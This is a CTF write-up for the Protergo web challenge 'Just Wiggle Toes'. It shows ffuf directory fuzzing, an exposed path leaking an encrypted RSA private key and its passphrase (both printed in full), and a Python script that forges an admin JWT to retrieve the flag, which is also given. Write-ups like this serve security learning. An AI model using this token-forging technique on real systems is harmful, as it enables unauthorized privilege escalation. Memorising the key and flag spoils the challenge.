---
tags:
  - CTF
  - protergo
  - web-exploitation
  - jwt
  - information-disclosure
  - directory-fuzzing
title: Protergo CTF - [Just Wiggle Toes]
---
![[Screenshot 2024-02-08 at 23.41.07.png]]
# Prologue

An Individual local competition that held by [Protergo](https://protergo.id/)company. The competition was starting from 1st February until 8th February. This competition is only limited to students.
# Write Up

## TL;DR Solution

1. Fuzzing directory by using wordlist in the [SecList](https://github.com/danielmiessler/SecLists) with prefix `directory-*`
2. Found partial source code in the `LittleSecrets`
3. Forge JWT with the private key to achieve an admin role

## Detailed Explanation

A black box challenge. There's no source code in the challenge. 
![[Screenshot 2024-02-09 at 03.25.52.png]]

The player is only given an index page and there's no noteworthy feature in the page. So, I decides to fuzz the directory in the application.

Since the competition is really long enough, I decided to make a big wordlist from [SecList](https://github.com/danielmiessler/SecLists).

```bash
cat directory-list-* | uniq > directory-list-wildcard-uniq.txt
```

After that, I tried to fuzz the directory using `ffuf` and left it for a few days.
```bash
ffuf -w ~/payloads/SecLists/Discovery/Web-Content/directory-list-wildcard-uniq.txt -u "http://jakarta.ctf.protergo.party:10003/FUZZ" -fc 404
```

![[Pasted image 20240209033409.png]]

Visiting `/portal_login`, the player is given a login form and a register button.
![[Screenshot 2024-02-09 at 03.47.45.png]]

By registering and trying to log in, the player is given the information that the flag is in the admin role.
![[Screenshot 2024-02-09 at 03.51.09.png]]

Visiting `/LittleSecrets`, the player got sensitive information about the application.
![[Screenshot 2024-02-09 at 03.37.29.png]]

The most important thing is the `private.pem` file and `passphrase` file, this files will be used to forge the JWT to achieve privilege escalation.

`passphrase`
```
dd2c2aa5a5aad06d93ec17f93f2efcaf
```

`private.pem`
```cert
-----BEGIN ENCRYPTED PRIVATE KEY-----
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
-----END ENCRYPTED PRIVATE KEY-----
```

## Exploitation

When the player login, the player is given a sample JWT 
![[Screenshot 2024-02-09 at 04.00.45.png]]

As the picture above, the value of JWT is like this.
```json
{"iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login","iat":1707425463,"exp":1707429063,"nbf":1707425463,"jti":"bRzfk0JlcI2McTAe","sub":"34","prv":"3da04507aadf132cee732fdee4ef6aa390dec579","is_admin":0}
```

Since the goal is privilege escalation, the player only needs to modify the value `is_admin` into `1`. Players need to forge the JWT by using the information that is already gathered.

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import jwt, requests, re
pem_bytes = open('./private.pem', 'rb').read()
passphrase = open('./passphrase', 'rb').read().strip()

private_key = serialization.load_pem_private_key(
    pem_bytes, password=passphrase, backend=default_backend()
)

URL = "http://jakarta.ctf.protergo.party:10003/"
encoded = jwt.encode({"iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login","iat":1707296171,"exp":99999999999,"nbf":1707296171,"jti":"kKpu6PDBBCiuFhdA","sub":"29","prv":"3da04507aadf132cee732fdee4ef6aa390dec579","is_admin":1}, private_key, algorithm="RS256")

sess = requests.Session()
sess.get(f'{URL}')
res = sess.get(f'{URL}home', cookies={"auth": encoded})
r = re.compile(r'PROTERGO{.*}')
print(r.findall(res.text)[0])
```

![[Screenshot 2024-02-09 at 04.03.18.png]]

FLAG: `PROTERGO{f5016c424def47159321869c8e7ff4cac79b9e721c0d700cf7c0c8ab7f43b203}`